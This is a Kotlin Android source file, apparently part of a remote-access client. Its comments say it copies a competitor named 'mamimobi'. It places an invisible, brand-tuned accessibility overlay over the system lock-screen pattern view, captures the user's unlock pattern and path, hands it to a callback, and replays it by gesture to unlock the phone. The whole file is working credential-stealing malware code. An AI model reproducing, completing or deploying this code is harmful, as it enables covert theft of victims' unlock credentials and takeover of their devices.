package com.vibelink.client.keyguard

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.PixelFormat
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import java.util.concurrent.locks.ReentrantLock

/**
 * mamimobi pk0：图案采集 **只挂 1 层**。
 * - 已 attach / 已有 view → 直接 return（不因 bounds 抖动 hide+add）
 * - 1s 内重复触发 → skip
 * - ReentrantLock 串行化 addView
 * nk0→pk0.e 卸层 → pk0.a：HOME(2) → dispatchGesture(350ms) → 1s 后再播一次。
 * 注意：竞品 performGlobalAction(2)=HOME，不是 BACK(1)；BACK 会把 Samsung 踢回锁屏保护页。
 */
class PatternCaptureOverlay(
    private val service: AccessibilityService,
    private val onPatternCaptured: (cells: List<Int>, pathPoints: List<Pair<Float, Float>>) -> Unit,
) {
    private val windowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val mainHandler = Handler(Looper.getMainLooper())
    private var patternView: PatternLockView? = null
    private var patternBounds = Rect()
    private val attached = AtomicBoolean(false)
    private val lastShowAt = AtomicLong(0L)
    private val showLock = ReentrantLock()

    fun isShowing(): Boolean = patternView != null && attached.get()

    fun show(bounds: Rect) {
        if (bounds.width() <= 0 || bounds.height() <= 0) {
            return
        }
        // 竞品 AccessService.E：已 attach 则绝不重挂
        if (attached.get() || patternView != null) {
            return
        }
        val now = System.currentTimeMillis()
        val last = lastShowAt.get()
        // 竞品：1s 内重复触发跳过
        if (last > 0L && now - last <= SHOW_THROTTLE_MS) {
            return
        }
        if (!showLock.tryLock()) {
            return
        }
        try {
            if (attached.get() || patternView != null) {
                return
            }
            patternBounds = Rect(bounds)
            val view = PatternLockView(service).apply {
                importantForAccessibility = android.view.View.IMPORTANT_FOR_ACCESSIBILITY_NO
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    importantForContentCapture =
                        android.view.View.IMPORTANT_FOR_CONTENT_CAPTURE_NO
                }
                @Suppress("DEPRECATION")
                systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                applyOemStyle(bounds)
                addPatternListener { cells, pathPoints ->
                    onPatternComplete(cells, pathPoints)
                }
            }
            // mamimobi pk0 flags = 65834:
            // DIM_BEHIND | NOT_FOCUSABLE | NOT_TOUCH_MODAL | LAYOUT_NO_LIMITS
            // Samsung 多次 add/remove DIM_BEHIND 会留下吃触摸的 dim 盾，封面/图案都滑不动。
            val samsung = Build.MANUFACTURER.equals("samsung", ignoreCase = true)
            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            if (!samsung) {
                flags = flags or WindowManager.LayoutParams.FLAG_DIM_BEHIND
            }
            val params = WindowManager.LayoutParams(
                bounds.width(),
                bounds.height(),
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                PixelFormat.TRANSLUCENT,
            ).apply {
                gravity = Gravity.TOP or Gravity.START
                x = bounds.left
                y = bounds.top
                alpha = 1f
                if (!samsung) {
                    dimAmount = 0.05f
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            runCatching {
                windowManager.addView(view, params)
                patternView = view
                attached.set(true)
                lastShowAt.set(System.currentTimeMillis())
                Log.i(TAG, "pattern overlay shown bounds=$bounds brand=${Build.BRAND}")
            }.onFailure {
                Log.w(TAG, "show overlay failed", it)
                patternView = null
                attached.set(false)
            }
        } finally {
            showLock.unlock()
        }
    }

    fun hide(removeOnly: Boolean = false) {
        showLock.lock()
        try {
            val view = patternView
            patternView = null
            attached.set(false)
            if (view != null) {
                // Samsung：偶发 isAttachedToWindow=false 但仍占着 ty=2032，跳过 remove 会留下吃触摸僵尸窗
                runCatching {
                    windowManager.removeViewImmediate(view)
                }.onFailure {
                    runCatching { windowManager.removeView(view) }
                        .onFailure { err -> Log.w(TAG, "pattern removeView failed", err) }
                }
            }
            if (!removeOnly) {
                Log.d(TAG, "pattern overlay hidden")
            }
        } finally {
            showLock.unlock()
        }
    }

    private fun onPatternComplete(
        cells: List<PatternLockView.PatternCell>,
        pathPoints: List<Pair<Float, Float>>,
    ) {
        if (cells.size < MIN_CELLS) {
            Log.i(TAG, "pattern too short cells=${cells.size}")
            patternView?.clearPattern()
            return
        }
        val cellIds = cells.map { it.id }
        val points = if (pathPoints.size >= 2) {
            pathPoints
        } else {
            cells.map { it.absX to it.absY }
        }
        mainHandler.post {
            // mamimobi nk0 → pk0.e() then pk0.a()
            hide(removeOnly = true)
            onPatternCaptured(cellIds, points)
            replayLikeCompetitor(points)
        }
    }

    /**
     * pk0.a：performGlobalAction(2)=HOME → dispatchGesture(350) → 1s 后再播。
     * 禁止用 BACK：Samsung 图案页 BACK 会关掉 bouncer 退回锁屏保护页。
     */
    private fun replayLikeCompetitor(points: List<Pair<Float, Float>>) {
        // AccessibilityService.GLOBAL_ACTION_HOME == 2（与竞品字面量一致）
        runCatching {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
        }
        val ok = PatternGestureCodec.replayPoints(
            service,
            points,
            PatternGestureCodec.DEFAULT_REPLAY_DURATION_MS,
        )
        Log.i(TAG, "pattern replay#1 home+gesture points=${points.size} ok=$ok")
        mainHandler.postDelayed({
            val ok2 = PatternGestureCodec.replayPoints(
                service,
                points,
                PatternGestureCodec.DEFAULT_REPLAY_DURATION_MS,
            )
            Log.i(TAG, "pattern replay#2 points=${points.size} ok=$ok2")
        }, REPLAY_RETRY_DELAY_MS)
    }

    /** mamimobi pk0.c — OEM stealth / sizing. */
    private fun PatternLockView.applyOemStyle(bounds: Rect) {
        setAspectRatioEnabled(true)
        setInputEnabled(true)
        setDotCount(3)
        isHapticFeedbackEnabled = true
        val ratio = if (bounds.height() != 0) {
            bounds.width() * 1f / bounds.height()
        } else {
            0f
        }
        val brand = Build.BRAND.orEmpty().lowercase(Locale.US)
        when {
            brand == "samsung" -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 100,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            brand == "huawei" || brand == "honor" -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 150,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            brand == "xiaomi" || brand == "redmi" || brand == "poco" || brand == "blackshark" -> {
                applyStealthDots(
                    normalDot = 8,
                    selectedDot = 20,
                    pathW = 5,
                    animMs = 150,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            brand == "vivo" || brand == "iqoo" -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 150,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            brand == "oppo" || brand == "realme" || brand == "oneplus" -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 150,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            brand == "tecno" || brand == "itel" || brand == "infinix" -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 50,
                    endMs = 50,
                    ratio = ratio,
                )
            }
            isHarmonyOs() -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 150,
                    endMs = 100,
                    ratio = ratio,
                )
            }
            else -> {
                applyStealthDots(
                    normalDot = 20,
                    selectedDot = 40,
                    pathW = 10,
                    animMs = 50,
                    endMs = 50,
                    ratio = ratio,
                )
            }
        }
    }

    private fun PatternLockView.applyStealthDots(
        normalDot: Int,
        selectedDot: Int,
        pathW: Int,
        animMs: Int,
        endMs: Int,
        ratio: Float,
    ) {
        // mamimobi: normal/path/correct = 0 so system LockPatternView shows through
        setNormalColor(0)
        setCorrectColor(0)
        setPathColor(0)
        setNormalDotSize(normalDot)
        setSelectedDotSize(selectedDot)
        setPathWidth(pathW)
        setAspectRatio(ratio)
        setDotVerticalAlign(PatternLockView.DotVerticalAlign.ALIGN_CENTER)
        setDotAnimationDuration(animMs)
        setPathEndAnimationDuration(endMs)
    }

    private fun isHarmonyOs(): Boolean {
        return runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                System.getProperty("config_os_brand", "").orEmpty()
            } else {
                val clazz = Class.forName("android.os.SystemProperties")
                val method = clazz.getMethod("get", String::class.java)
                method.invoke(null, "config_os_brand") as? String
            }.orEmpty().lowercase(Locale.US).contains("harmony")
        }.getOrDefault(false)
    }

    companion object {
        private const val TAG = "PatternCapture"
        private const val MIN_CELLS = 4
        private const val REPLAY_RETRY_DELAY_MS = 1000L
        /** 竞品 pk0.g：1s 内禁止重复 addView */
        private const val SHOW_THROTTLE_MS = 1000L
    }
}
